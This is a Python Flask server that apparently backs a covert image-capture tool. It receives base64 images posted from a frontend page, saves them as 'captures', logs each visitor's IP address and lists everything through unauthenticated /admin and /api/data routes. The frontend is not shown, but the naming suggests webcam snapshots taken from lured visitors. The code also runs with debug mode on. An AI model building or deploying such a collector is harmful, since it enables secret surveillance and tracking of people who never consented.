from flask import Flask, request, send_from_directory, jsonify
import os, base64
from datetime import datetime
from flask_cors import CORS

app = Flask(__name__, static_folder="frontend")
CORS(app)  # Enable CORS for all routes

CAPTURE_DIR = "captures"
LOG_FILE = "logs.txt"

os.makedirs(CAPTURE_DIR, exist_ok=True)

def log_ip(ip, file):
    with open(LOG_FILE, "a") as f:
        f.write(f"{datetime.now()} | {ip} | {file}\n")

@app.route("/")
def index():
    return send_from_directory("frontend", "index.html")

@app.route("/admin")
def admin():
    return send_from_directory("frontend", "admin.html")

@app.route("/upload", methods=["POST"])
def upload():
    try:
        # Get JSON data
        json_data = request.get_json()
        if not json_data:
            return {"status": "error", "message": "No JSON data"}, 400
        
        data = json_data.get("image")
        if not data:
            return {"status": "error", "message": "No image data"}, 400

        # Validate base64 data format
        if "," not in data:
            return {"status": "error", "message": "Invalid image format"}, 400

        ip = request.remote_addr
        
        try:
            header, encoded = data.split(",", 1)
            img_data = base64.b64decode(encoded)
        except Exception as e:
            return {"status": "error", "message": f"Base64 decode failed: {str(e)}"}, 400

        if not img_data or len(img_data) < 100:
            return {"status": "error", "message": "Image data too small"}, 400

        filename = datetime.now().strftime("%Y%m%d_%H%M%S") + ".png"
        path = os.path.join(CAPTURE_DIR, filename)

        with open(path, "wb") as f:
            f.write(img_data)

        log_ip(ip, filename)
        print(f"[SUCCESS] Captured: {filename} from {ip}")

        return {"status": "saved", "filename": filename}, 200
    
    except Exception as e:
        print(f"[ERROR] Upload failed: {str(e)}")
        return {"status": "error", "message": str(e)}, 500

@app.route("/captures/<file>")
def get_file(file):
    return send_from_directory(CAPTURE_DIR, file)

@app.route("/api/data")
def data():
    files = sorted(os.listdir(CAPTURE_DIR), reverse=True)

    logs = []
    if os.path.exists(LOG_FILE):
        with open(LOG_FILE) as f:
            logs = f.readlines()

    return jsonify({
        "files": files,
        "logs": logs[::-1]
    })

if __name__ == "__main__":
    app.run(host="127.0.0.1", port=5000, debug=True)